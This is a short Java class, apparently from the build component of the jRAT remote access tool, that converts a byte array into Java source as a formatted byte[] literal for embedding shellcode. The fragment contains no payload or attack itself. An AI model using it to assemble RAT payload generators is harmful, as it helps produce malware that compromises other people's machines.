package io.jrat.controller.build.shellcode;

import io.jrat.controller.utils.ShellcodeUtils;

public class Java implements Shellcode {

	@Override
	public String generate(String arrayName, byte[] array) throws Exception {
		StringBuilder builder = new StringBuilder();

		builder.append("byte[] " + arrayName + " = new byte[] {" + ShellcodeUtils.LINE_SEPARATOR);

		int count = 0;
		for (int i = 0; i < array.length; i++) {
			byte b = array[i];

			count++;

			if (i == array.length - 1) {
				builder.append("(byte) " + ShellcodeUtils.get0XByte(b));
			} else {
				builder.append("(byte) " + ShellcodeUtils.get0XByte(b) + ", ");
				if (count >= 16) {
					count = 0;
					builder.append(ShellcodeUtils.LINE_SEPARATOR);
				}
			}
		}

		builder.append(ShellcodeUtils.LINE_SEPARATOR + "};");

		return builder.toString();
	}

}
